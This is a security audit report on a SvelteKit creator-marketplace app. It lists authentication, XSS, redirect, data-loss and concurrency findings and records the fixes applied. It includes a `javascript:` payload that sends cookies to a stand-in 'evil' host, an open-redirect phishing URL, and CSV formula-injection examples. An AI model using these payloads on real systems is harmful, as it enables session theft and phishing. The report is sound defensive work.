# Bug hunt — Creator Network

> **Status: all findings below have been fixed.** Every item from C1 through L12 was
> addressed in a follow-up pass, except **L9**, which was wrong — `creator_categories`
> and `creator_languages` are pure join tables with no `deletedAt` column, so there is
> nothing to filter. The findings are kept as written so the reasoning behind each
> change stays on record; see "What changed" at the end.
>
> **Before deploying**, `creators.userId` gained a unique index (H6) — run
> `npm run db:push`, and if it fails, resolve pre-existing duplicates first:
> `select user_id, count(*) from creators where user_id is not null group by user_id having count(*) > 1;`

Read-only audit of `src/` (domain, server, routes, components, schema). Nothing was
changed. `npm run check` passes with 0 errors / 39 warnings; `npx eslint .` reports
166 errors, almost all stylistic (`no-explicit-any`, `no-navigation-without-resolve`,
unused imports) — those are not repeated below.

Findings are ordered by severity. Each one names the file and line, what actually
goes wrong, and how it is reached.

---

## Critical

### C1. Every admin CRUD form action is completely unauthenticated

**Files:** `src/routes/dashboard/admin/{countries,regions,categories,platforms,languages,creators,organizations}/+page.server.ts`
**Guard that was supposed to cover them:** `src/routes/dashboard/admin/+layout.server.ts:6`

All seven routes export `contentCrud(...).actions` directly:

```ts
// src/routes/dashboard/admin/countries/+page.server.ts:6
export const { load, actions } = contentCrud({ table: t.countries, ... });
```

```ts
// src/routes/dashboard/admin/creators/+page.server.ts:26
export const actions = crud.actions;
```

None of them calls `requireRole(event, 'admin')`. The only check lives in the admin
layout's **`load`**:

```ts
// src/routes/dashboard/admin/+layout.server.ts:5
export const load: LayoutServerLoad = async (event) => { requireRole(event, 'admin'); return {}; };
```

In SvelteKit, a POST to a form action runs **the action first**, and `load`
functions only run afterwards to re-render the page. The layout guard therefore
never executes before the write, and when it does execute the row has already been
inserted, updated or deleted. `contentCrud` itself only ever reads
`locals.user?.id` optionally (`src/lib/server/crud.ts:161,187`) — it never requires a
session.

`src/hooks.server.ts` has no path-based guard either, so there is nothing else in
the chain.

**Impact.** An unauthenticated request to `/dashboard/admin/creators?/edit` can
rewrite any creator row — including `verificationLevel`, `isFeatured`,
`isTrending`, `isPublished` and `username`. `/dashboard/admin/organizations?/delete`
hard-deletes any organisation (and cascades — see H4). `/dashboard/admin/countries?/edit`
can rewrite `usdRate`, which is the single input to every currency conversion in
`src/lib/domain/money.ts`. SvelteKit's built-in CSRF origin check stops a
cross-site browser POST but not a direct request with a matching `Origin` header.

**Fix shape:** call `requireRole(event, 'admin')` inside each action, or wrap
`contentCrud`'s returned actions in a guard helper. Authorization must live in the
action, never only in a `load`.

---

## High

### H1. Stored XSS: `z.url()` accepts `javascript:` — submission links are rendered as `href`

**Schema:** `src/lib/schemas.ts:456` — `contentUrl: z.url(...)`
**Rendered at:** `src/routes/dashboard/bookings/[id]/+page.svelte:513` and `:881`

Zod v4's `z.url()` validates through the `URL` constructor, which accepts any
scheme. Verified in this repo's installed `zod`:

```
javascript:alert(1)             => valid
data:text/html,<script>…</script> => valid
vbscript:x                      => valid
```

A creator submits `javascript:fetch('//evil/'+document.cookie)` as their
deliverable link. The brand-side user opens the booking and clicks "view
submitted work":

```svelte
<a href={sub.contentUrl} target="_blank" rel="noreferrer">
```

Svelte does not sanitise `href`. `target="_blank"` does not neutralise a
`javascript:` URL — it executes in the current document. This is creator → brand
stored XSS on an authenticated page.

**Fix shape:** constrain the scheme, e.g. `z.url({ protocol: /^https?$/ })` or a
`.refine(v => /^https?:\/\//.test(v))`, and reject anything else.

### H2. Stored XSS: verification `socialProofs` are unvalidated and rendered as `href` to operators

**Schema:** `src/lib/schemas.ts:495` — `socialProofs: lines` (plain `z.string()`, no URL check)
**Stored at:** `src/routes/dashboard/verification/+page.server.ts:102`
**Rendered at:** `src/routes/dashboard/admin/verification/+page.svelte:170` — `href={proof}`

Any creator or brand can submit an arbitrary string per line. It is split, stored
verbatim, and rendered directly into an anchor in the operator's verification
queue. Same execution path as H1, but the victim is always an **admin**, which
makes it a privilege-escalation vector when combined with the admin surface.

`documentUrl` on the same form (`src/lib/schemas.ts:491`) is also an unvalidated
`z.union([z.instanceof(File), z.string()])`; it happens to be rendered through
`assetUrl()` (`src/routes/dashboard/admin/verification/+page.svelte:153`), which
prefixes unknown values with `/files/`, so that one is currently defused by
accident rather than by design.

### H3. Open redirect on `/login?next=`

**File:** `src/routes/login/+page.server.ts:11` and `:36`

```ts
if (locals.user) redirect(303, url.searchParams.get('next') ?? '/dashboard');
...
redirect(303, event.url.searchParams.get('next') ?? '/dashboard');
```

`next` is never validated. `/login?next=https://evil.example/harvest` redirects a
user off-site immediately after a successful sign-in — the highest-trust moment in
the flow. `requireUser` (`src/lib/server/guards.ts:13`) builds this parameter from
`event.url.pathname + event.url.search`, so the legitimate value is always a
site-relative path.

**Fix shape:** accept only values matching `/^\/(?!\/)/`.

### H4. `contentCrud.delete` is a hard DELETE on soft-delete tables, and it cascades

**File:** `src/lib/server/crud.ts:218`

```ts
await db.delete(table).where(and(eq(table.id, ...), ...guards()));
```

Every table routed through `contentCrud` carries a `deletedAt` column, and several
routes pass `excludeDeleted: true` (`campaigns`, `admin/creators`,
`admin/organizations`) — which only makes sense if deletion were soft. It isn't.

The foreign keys turn this into data loss well beyond the targeted row:

- deleting a campaign → `applications.campaignId` is `onDelete: 'cascade'`
  (`src/lib/server/db/schema.ts:428` region) → every application to it disappears;
- deleting a creator or organisation → `bookings.creatorId` / `bookings.organizationId`
  are `onDelete: 'cascade'` (`schema.ts:480-485`) → completed bookings, their
  `termsSnapshot`, and their reviews are destroyed.

The README states terms freeze on acceptance and that the audit log is never
rewritten; a hard delete silently removes the rows those guarantees are about.

### H5. `crud.delete` skips the ownership check that `crud.edit` performs

**File:** `src/lib/server/crud.ts:191` vs `:218`

`edit` inspects `rowsAffected` and returns 403 when a scoped update matched
nothing:

```ts
if (scope && (result?.rowsAffected ?? result?.[0]?.affectedRows ?? 1) === 0) { ... 403 }
```

`delete` applies the same `guards()` (so it is not exploitable), but never checks
the result — deleting another creator's package id returns a cheerful
`"<Label> deleted"` success toast having deleted nothing. Inconsistent feedback on
a security-relevant path is how the real check gets removed later.

### H6. Duplicate creator profiles and duplicate organisations can be created

**Files:** `src/routes/dashboard/profile/create/+page.server.ts:30`,
`src/routes/dashboard/organization/create/+page.server.ts:33`

Both `load` functions redirect away when a profile already exists
(`profile/create:17`, `organization/create:24`), but **neither `default` action
re-checks**. Posting the form twice — a double-click, a retry, or a direct POST —
creates a second `creators` row for the same `userId` (there is no unique index on
`creators.userId`) or a second organisation.

Downstream, `getCreatorFor` and `getOrganizationFor` (`src/lib/server/guards.ts:41,64`)
both do `.limit(1)` with no ordering, so which duplicate the user "is" becomes
whatever MySQL returns that day. Every scoped CRUD surface, every booking access
check and every score rollup then targets an arbitrary one of the two rows.

---

## Medium

### M1. Operators can never create a campaign

**File:** `src/routes/dashboard/campaigns/+page.server.ts:50, 59-78, 101`

For an admin, `context()` returns `organization: null`, so `buildCrud(null)` omits
the `scope` entirely — which is also what stamps `organizationId` onto the insert
(`src/lib/server/crud.ts:160`). But `campaigns.organizationId` is `.notNull()`
(`src/lib/server/db/schema.ts:356`). Every operator `add` therefore throws, is
swallowed by the catch at `crud.ts:165`, and surfaces as a generic
"Failed to add campaign" 500.

### M2. The campaign audit log records failed writes as successes

**File:** `src/routes/dashboard/campaigns/+page.server.ts:106-117` and `126-136`

```ts
const result = await buildCrud(...).actions.add(event);
await recordAudit({ ..., action: 'created', toState: String(form.get('status') ?? 'draft') });
return result;
```

`recordAudit` runs unconditionally, ignoring whether `result` is a success message
or a 400/500 error message. Combined with M1, every failed operator campaign
creation writes a `created` entry. The `add` path also never sets `entityId`, so
those entries cannot be tied back to a row.

### M3. The "one open verification case" rule reads the whole table and can be bypassed

**File:** `src/routes/dashboard/verification/+page.server.ts:57-81`

```ts
const open = await db.select(...).where(<this subject>).limit(20);        // ← capped at 20
const pending = open.length
  ? await db.select(...).where(or(status='pending', status='under_review'))   // ← NO subject filter
  : [];
if (pending.some((row) => open.some((o) => o.id === row.id))) { ... 409 }
```

Two problems. The `limit(20)` means a subject with more than 20 historical requests
can have its open case fall outside the window, letting it submit again and flood
the operator queue. And the `pending` query has no subject predicate at all — it
loads every pending/under-review request on the platform on each submission, then
intersects in JavaScript.

**Fix shape:** one query — `where(subjectFilter AND status IN ('pending','under_review')) LIMIT 1`.

### M4. `applicationsCount` only ever goes up

**Increment:** `src/routes/(public)/campaigns/[slug]/+page.server.ts:106-109`
**Missing decrement:** `src/routes/dashboard/applications/+page.server.ts:198` (`withdraw`)

Applying increments `campaigns.applicationsCount`. Withdrawing sets the application
to `withdrawn` and never decrements. The number shown on every campaign card
drifts permanently upward and cannot be reconciled from the applications table.
Note the codebase already has the right pattern for this — `src/lib/server/db/rollups.ts`
recomputes counters set-based rather than incrementing ("Recount, never increment").

### M5. Deleted social channels still count toward score, publishing and discovery

Three places disagree about which `socialAccounts` rows are live:

| Location | Filter | Consequence |
| --- | --- | --- |
| `src/lib/server/score-service.ts:35-37` | none | soft-deleted channels drag the averaged `engagementRate` into the score |
| `src/lib/server/score-service.ts:63-67` | `isNull(deletedAt)` | reach is computed from a different set than engagement |
| `src/lib/server/queries.ts:108-115` | none | discovery cards show engagement and platform badges from deleted channels |
| `src/lib/server/queries.ts:191` | `live(...)` | the profile page shows a different set than the card that led to it |
| `src/routes/dashboard/profile/+page.server.ts:34, 129` | none | a creator can delete every channel and still pass the "at least one channel" publish gate |

That last row is the load-bearing one: `togglePublish` (`:124-144`) counts channels
without excluding deleted ones, so the PRD FR-014 publishing requirement is
satisfiable with zero live channels.

### M6. `getBookingDetail` loads every booking on the platform to find one

**File:** `src/lib/server/queries.ts:416`

```ts
const [booking] = await listBookings().then((rows) => rows.filter((r) => r.id === bookingId));
```

`listBookings()` with no filter selects every non-deleted booking, joined to
creators and organisations, then discards all but one in JavaScript. This runs on
every load of `/dashboard/bookings/[id]`. `getCampaignBySlug` (`:361-364`) has the
same shape — full table scan then `.find()`.

### M7. Unfiltered table reads leak scope

- `src/routes/dashboard/campaigns/+page.server.ts:87-89` — `db.select({campaignId, status}).from(t.applications)` with **no** where clause. Every brand's campaigns page loads the application ids and statuses of every campaign on the platform.
- `src/routes/dashboard/reviews/+page.server.ts:9-17` — when the user has neither a creator profile nor an organisation, `mine` is `undefined` and `and(undefined, isActive, deletedAt)` degrades to "all reviews". A signed-in user mid-onboarding sees every review on the platform.

### M8. Uploads have no size or content-type validation

**File:** `src/lib/server/upload.ts:22-35`

`saveUploadedFile` streams whatever it is handed straight to disk. The
`accept="image/*,application/pdf"` on `src/lib/formComponents/FileUpload.svelte:85`
is client-side only, and the server-side schemas
(`crud.ts` `fileFields`, `schemas.ts:491`) only check `instanceof File && size > 0`.
There is no byte cap and no MIME check — a direct multipart POST can fill the disk.
The extension is taken verbatim from the client filename (`path.extname(file.name)`).

`/files/[name]` (`src/routes/files/[name=filename]/+server.ts`) does serve unknown
extensions as `application/octet-stream` with `no-store`, which blunts the
served-HTML angle, but the write itself is unbounded.

### M9. `/files/[name]` serves identity documents with no authentication

**File:** `src/routes/files/[name=filename]/+server.ts:83`

The handler checks path traversal (correctly — `path.relative` + `..` check at
`:86-89`) but never looks at `locals.user`. Verification uploads land in the same
directory as avatars (`src/routes/dashboard/verification/+page.server.ts:87`), so a
KYC document is retrievable by anyone holding or guessing its UUID filename. The
UUID is unguessable in practice, but the URL leaks through referrers, logs, and
browser history, and there is no defence in depth behind it.

### M10. CSV export is vulnerable to formula injection

**File:** `src/lib/components/Table/table-export.svelte:99-117`

Cell text is passed to `Papa.unparse` unescaped. A creator whose bio or campaign
title starts with `=`, `+`, `-` or `@` produces a CSV that Excel and LibreOffice
execute on open (`=HYPERLINK(...)`, `=cmd|...`). The exported fields are all
user-supplied.

The same function also calls `URL.revokeObjectURL(url)` synchronously right after
`link.click()` (`:114-116`) and never appends the anchor to the document — both
patterns abort the download in some browsers.

---

## Low

### L1. Booking references collide

**File:** `src/lib/domain/booking.ts:134-139`

```ts
const random = Math.random().toString(36).slice(2, 6).toUpperCase();
return `CN-${stamp}-${random}`;
```

Four base-36 characters within a `YYMM` bucket is 1,679,616 possibilities. By the
birthday bound, roughly 1,500 bookings in one month gives a ~50% chance of at least
one collision, and `bookings.reference` carries a unique index
(`src/lib/server/db/schema.ts:513`). The insert throws and the user sees a generic
"Booking failed" (`src/routes/(public)/creators/[username]/+page.server.ts:136`)
with no retry.

### L2. `campaignLabel` maps statuses that do not exist and misses two that do

**File:** `src/lib/domain/booking.ts:107-114` vs `src/lib/server/db/schema.ts:344-350`

| In the label map | In the DB enum |
| --- | --- |
| draft, published, closed, **paused**, **archived** | draft, published, closed, **cancelled**, **completed** |

`paused` and `archived` are unreachable. `cancelled` and `completed` fall through
to `status.replace(/_/g, ' ')` and render untranslated in both locales.

### L3. Booking notifications are hardcoded English in an otherwise fully translated app

The messages catalogue is in excellent shape — 1,106 keys, `am.json` and `en.json`
in exact parity, no placeholder mismatches, only 5 deliberately-identical values.
These strings escaped it:

- `src/routes/dashboard/bookings/[id]/+page.server.ts:268-269` — `'Terms agreed'`, `` `${booking.title} is now booked…` ``
- `:356-357` — `'Booking completed'`
- `:413-414` — `'Work submitted for review'`
- `:502` — `'Revision requested'`
- `src/routes/dashboard/applications/+page.server.ts:96-99, 158-159`
- `src/routes/(public)/creators/[username]/+page.server.ts:114`
- `src/routes/(public)/campaigns/[slug]/+page.server.ts:120`
- `src/routes/dashboard/profile/+page.server.ts:137-139` — `'a bio'`, `'at least one channel'`, `'at least one package'` are English fragments interpolated *into* the translated `srv_add_before_publishing` message.

### L4. `formatMoney` and `formatEthiopianDate` will not agree between server and client

- `src/lib/domain/money.ts:54` — `amount.toLocaleString(undefined, ...)` resolves against the Node process locale on the server and the browser locale on the client. Different thousands separators between SSR and hydration.
- `src/lib/global.svelte.ts:20-28` — `formatEthiopianDate` is hardcoded to `'en-US'` Gregorian. Despite the name and the Amharic locale, no date on the site ever localises.

### L5. Profile category/language rewrite is not transactional

**File:** `src/routes/dashboard/profile/+page.server.ts:95-103`

```ts
await db.delete(t.creatorCategories).where(...);
for (const categoryId of form.data.categoryIds) { await db.insert(...); }
```

Delete-then-loop-insert with no transaction. `categoryIds` and `languageIds` are
`z.array(z.coerce.number())` (`src/lib/schemas.ts:187-188`) with no check that the
ids exist, so one bad id raises a foreign-key error partway through and leaves the
creator with a partially-wiped category list. Also N+1 inserts where one
multi-row insert would do.

### L6. Read-modify-write races on booking state

`src/routes/dashboard/bookings/[id]/+page.server.ts`:

- `:285` — `fund` reads `booking.escrowStatus !== 'unfunded'`, then updates. Two concurrent requests both pass the check.
- `:489` — `revisionsUsed: booking.revisionsUsed + 1` computed from a value read earlier in the request. Concurrent revision requests lose an increment, letting the allowance be exceeded.
- `:460` — the second `transition(... 'approved' → 'awaiting_settlement')` discards its result; if it fails the booking is stranded in `approved`, which `settle` cannot leave (`canTransition('approved','completed')` is `false`).

Use `WHERE`-guarded conditional updates (`... AND escrow_status = 'unfunded'`) and
`SET revisions_used = revisions_used + 1`.

### L7. `fund` accepts non-paid bookings

**File:** `src/routes/dashboard/bookings/[id]/+page.server.ts:278-317`

Nothing checks `booking.compensationType`. A barter or event-pass booking can be
marked as having a held deposit and a `paymentMethod`, which contradicts the
README's stance that the escrow record reflects a real recorded obligation.

### L8. Direct booking does not verify the creator is bookable

**File:** `src/routes/(public)/creators/[username]/+page.server.ts:53-61`

The creator row is fetched by the client-supplied `form.data.creatorId` with no
`isPublished`, `isActive` or `deletedAt` filter, and with no check that it matches
the profile the form was rendered on. A brand can open a booking against a
soft-deleted or never-published creator.

### L9. `refreshCreatorScore` uses `count(*)` on `creatorCategories` / `creatorLanguages` while `packages` and `portfolioItems` correctly exclude deleted rows

**File:** `src/lib/server/score-service.ts:18-33` — the first two queries have no
`deletedAt` predicate, the next two do. Minor, but the score is documented as
"derived from evidence only" and the evidence sets disagree.

### L10. `getPlatformStats` counts soft-deleted campaigns

**File:** `src/lib/server/queries.ts:504-507` — `where(eq(t.campaigns.status, 'published'))`
with no `isNull(deletedAt)`, unlike every other count in the same function. The
homepage campaign figure is inflated by deleted rows.

### L11. `invalidateStatCache` is called with a doubled path

**File:** `src/lib/server/upload.ts:26-32`

```ts
const target = path.join(FILES_DIR, fileName);      // ".tempFiles/uuid.png"
...
invalidateStatCache(path.resolve(FILES_DIR, target)); // "<cwd>/.tempFiles/.tempFiles/uuid.png"
```

`target` already contains `FILES_DIR`, so the resolved path never matches the key
`getCachedStats` stores (`src/routes/files/[name=filename]/+server.ts:85,92`). The
eviction is a no-op. Harmless for fresh uploads (no entry exists yet), but it
means the function does not work if it is ever used for overwrites or deletes.

Also at `:37`: `import { invalidateStatCache } from '$lib/server/fileCache';` sits
at the bottom of the file. Hoisting saves it, but it reads as a mistake.

### L12. `savedIds` is captured once and never refreshes

**File:** `src/routes/(public)/discover/+page.svelte:30` — `let savedIds = $state(data.savedIds)`

This is the one `state_referenced_locally` warning from `svelte-check` that is a
real bug rather than the standard `superForm(data.form)` pattern: after
`invalidateAll()` or a client-side navigation back to `/discover`, the shortlist
badges keep showing the state from first render. The other 38 warnings of that
class are superforms initialisation and are fine.

---

## What is in good shape

Worth recording, because the audit turned up genuine care in these areas:

- **No `{@html}` anywhere** in the codebase — the two XSS findings above are both
  `href` scheme issues, not markup injection.
- **Path traversal in `/files/[name]` is correctly handled** (`path.relative` +
  `..` / `isAbsolute` check), including against percent-encoded separators, which
  the param matcher rejects post-decode.
- **The `crud.ts` `scope` mechanism is sound** — the owning column filters reads,
  filters the update/delete target, and is stamped onto inserts from the session.
  Creator-facing surfaces (packages, channels, portfolio) all use it correctly.
- **Rollups are recomputed set-based, never incremented** (`src/lib/server/db/rollups.ts`),
  and the review-filter definition is shared between the list query and the average
  so they cannot drift.
- **Review pagination has a total order** (`createdAt, id`) — a real bug avoided.
- **`ratingReviewFilter` is a function, not a constant**, and the paraglide message
  helpers are consistently called lazily. Only the eight sites in L3 escaped it.
- **Message catalogues are at exact parity** across `en` and `am` with no
  placeholder mismatches.
- **Login errors are deliberately vague** (`src/routes/login/+page.server.ts:28`)
  and sign-up cannot claim the `admin` role (`src/lib/schemas.ts:64`).

---

---

## What changed

Fixes were applied in severity order. `npm run check` reports 0 errors and
`npm run build` succeeds.

| # | Fix |
| --- | --- |
| C1 | `contentCrud` gained a `guard` option, invoked at the top of every action; all seven admin routes pass `requireRole(event, 'admin')`. Authorisation can never live in a `load` again. |
| H1 | New `isHttpUrl` check in `schemas.ts` replaces `z.url()` for `contentUrl`; `optionalUrl` uses it too. |
| H2 | `socialProofs` validates every line as http(s); `documentUrl`'s string branch does the same. |
| H3 | `safeNext()` in `guards.ts` accepts only single-slash absolute paths; both login redirects use it. |
| H4 | `crud.delete` soft-deletes when the table has `deletedAt`, and `excludeDeleted` now defaults to `true` so the listing matches. |
| H5 | `delete` checks `rowsTouched` and returns 403, like `edit`. Both share one helper. |
| H6 | Create actions re-check for an existing profile/organisation; `creators.userId` gained a unique index; `getCreatorFor`/`getOrganizationFor` order by id so "which one" is deterministic. |
| M1 | `campaignShape` gained `organizationId`; operators pick an owner in the form, brands still get theirs stamped from session. `crud.edit` now re-stamps the scope column so a posted owner id cannot reassign a row. |
| M2 | `succeeded()` gates every `recordAudit` call in the campaigns route; `delete` gained the audit entry it never had. |
| M3 | One predicate replaces the 20-row cap and the unfiltered platform-wide scan. |
| M4 | `recalcCampaignApplications` in `rollups.ts`; called on both apply and withdraw. |
| M5 | `liveSocialFilter()` in `rollups.ts` is now the only definition, used in all five places — including the publish gate. |
| M6 | `listBookings({ id })` and `listCampaigns({ slug })` filter in SQL. |
| M7 | Campaign application counts are scoped to the page's own campaigns; the reviews page shows nothing to a user who is neither creator nor brand nor operator. |
| M8 | `saveUploadedFile` enforces an 8 MB cap (twice — declared size and streamed bytes), an allow-list of types, and derives the extension from the type rather than the filename. Rejections surface as form messages. |
| M9 | Verification evidence goes to a private directory served by `/files/private/[name]`, which requires an operator or the submitting subject. File-serving logic is shared so the two routes cannot drift. |
| M10 | CSV cells opening with `=`, `+`, `-`, `@` are prefixed with an apostrophe; the download anchor is attached and revoked out-of-tick; print waits for `afterprint`. |
| L1 | `bookingReference` draws 8 characters from `crypto.getRandomValues` (32^8 per month bucket). |
| L2 | `campaignLabel` now mirrors `campaignStatusEnum` exactly; the phantom `paused`/`archived` keys were removed and `cancelled`/`completed` added. |
| L3 | 16 new message keys; every notification and the publish-gate fragments are translated. |
| L4 | `intlLocale()` in `src/lib/locale.ts` gives server and client the same tag; `formatEthiopianDate` became `formatLongDate` and honours the locale. |
| L5 | Profile categories/languages rewrite in one transaction, with ids validated first and inserted in one statement. |
| L6 | `fund` re-tests `escrow_status` in the WHERE clause; `revisionsUsed` increments in SQL; the transient `approved` transition's result is checked. |
| L7 | `fund` refuses a non-paid booking. |
| L8 | Direct booking requires the creator to be published, active and not deleted. |
| L9 | *Not a bug* — those join tables have no `deletedAt`. |
| L10 | Published-campaign count excludes deleted rows. |
| L11 | `invalidateStatCache` gets the correctly resolved path; the bottom-of-file import moved to the top. |
| L12 | Shortlist state is a `$derived` over `data.savedIds` with an optimistic override that clears on new server data. |

Left alone deliberately: the 166 eslint findings (`no-explicit-any`,
`no-navigation-without-resolve`, unused imports) and the 38 `state_referenced_locally`
warnings, which are the standard `superForm(data.form)` pattern.
